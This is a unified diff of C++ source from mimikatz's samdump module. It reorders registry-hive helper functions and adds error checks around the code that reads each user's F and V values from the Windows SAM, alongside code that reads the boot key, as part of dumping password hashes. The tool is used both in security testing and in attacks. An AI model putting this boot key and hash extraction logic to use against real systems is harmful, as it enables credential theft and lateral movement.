@@ -190,40 +190,6 @@ bool mod_mimikatz_samdump::getBootKeyFromHive(mod_hive::hive * theHive, string *
 	return reussite;
 }
 
-bool mod_mimikatz_samdump::getNControlSetFromHive(mod_hive::hive * theHive, string * rootKey, DWORD * nControlSet)
-{
-	bool reussite = false;
-
-	string * selectKey = new string(*rootKey); selectKey->append("\\Select");
-	string * nDefault = new string("Default");
-	int longueur = 0; unsigned char *buffer = NULL;
-
-	if(mod_hive::RegOpenKeyQueryValue(theHive, selectKey, nDefault, &buffer, &longueur))
-	{
-		if(reussite = (longueur == sizeof(DWORD)))
-			*nControlSet = *(DWORD *) (buffer);
-		delete[] buffer;
-	}
-
-	delete nDefault, selectKey;
-	return reussite;
-}
-
-bool mod_mimikatz_samdump::getInfosFromReg(BYTE bootkey[0x10])
-{
-	bool reussite = false;
-
-	wstring * computerName = new wstring();
-	if(mod_system::getComputerName(computerName))
-		wcout << L"Ordinateur : " << *computerName << endl;
-	delete computerName;
-
-	if(reussite = getBootKeyFromReg(bootkey))
-		wcout << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
-
-	return reussite;
-}
-
 bool mod_mimikatz_samdump::getBootKeyFromReg(BYTE bootkey[0x10])
 {
 	bool reussite = false;
@@ -259,6 +225,43 @@ bool mod_mimikatz_samdump::getBootKeyFromReg(BYTE bootkey[0x10])
 
 	return reussite;
 }
+
+
+
+bool mod_mimikatz_samdump::getNControlSetFromHive(mod_hive::hive * theHive, string * rootKey, DWORD * nControlSet)
+{
+	bool reussite = false;
+
+	string * selectKey = new string(*rootKey); selectKey->append("\\Select");
+	string * nDefault = new string("Default");
+	int longueur = 0; unsigned char *buffer = NULL;
+
+	if(mod_hive::RegOpenKeyQueryValue(theHive, selectKey, nDefault, &buffer, &longueur))
+	{
+		if(reussite = (longueur == sizeof(DWORD)))
+			*nControlSet = *(DWORD *) (buffer);
+		delete[] buffer;
+	}
+
+	delete nDefault, selectKey;
+	return reussite;
+}
+
+bool mod_mimikatz_samdump::getInfosFromReg(BYTE bootkey[0x10])
+{
+	bool reussite = false;
+
+	wstring * computerName = new wstring();
+	if(mod_system::getComputerName(computerName))
+		wcout << L"Ordinateur : " << *computerName << endl;
+	delete computerName;
+
+	if(reussite = getBootKeyFromReg(bootkey))
+		wcout << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
+
+	return reussite;
+}
+
 
 bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
 {
@@ -303,18 +306,18 @@ bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
 										if(reussite &= (code == ERROR_SUCCESS))
 										{
 											DWORD tailleF = 0, tailleV = 0;
-											RegQueryValueEx(monUser, L"F", NULL, NULL, NULL, &tailleF);
-											RegQueryValueEx(monUser, L"V", NULL, NULL, NULL, &tailleV);
-											
-											mod_hash::USER_F * userF = reinterpret_cast<mod_hash::USER_F *>(new BYTE[tailleF]);
-											mod_hash::USER_V * userV = reinterpret_cast<mod_hash::USER_V *>(new BYTE[tailleV]);
+											if((RegQueryValueEx(monUser, L"F", NULL, NULL, NULL, &tailleF) == ERROR_SUCCESS) &&
+												(RegQueryValueEx(monUser, L"V", NULL, NULL, NULL, &tailleV) == ERROR_SUCCESS))
+											{
+												mod_hash::USER_F * userF = reinterpret_cast<mod_hash::USER_F *>(new BYTE[tailleF]);
+												mod_hash::USER_V * userV = reinterpret_cast<mod_hash::USER_V *>(new BYTE[tailleV]);
 
-											RegQueryValueEx(monUser, L"F", NULL, NULL, reinterpret_cast<BYTE *>(userF), &tailleF);
-											RegQueryValueEx(monUser, L"V", NULL, NULL, reinterpret_cast<BYTE *>(userV), &tailleV);
-											
-											infosFromUserAndKey(userF, userV, hBootKey);
+												if((RegQueryValueEx(monUser, L"F", NULL, NULL, reinterpret_cast<BYTE *>(userF), &tailleF) == ERROR_SUCCESS) &&
+													(RegQueryValueEx(monUser, L"V", NULL, NULL, reinterpret_cast<BYTE *>(userV), &tailleV) == ERROR_SUCCESS))
+													infosFromUserAndKey(userF, userV, hBootKey);
 
-											delete[] userF, userV;
+												delete[] userF, userV;
+											}
 											RegCloseKey(monUser);
 										}
 									}
@@ -333,7 +336,6 @@ bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
 
 	return reussite;
 }
-
 
 void mod_mimikatz_samdump::infosFromUserAndKey(mod_hash::USER_F * userF, mod_hash::USER_V * userV, BYTE hBootKey[0x20])
 {
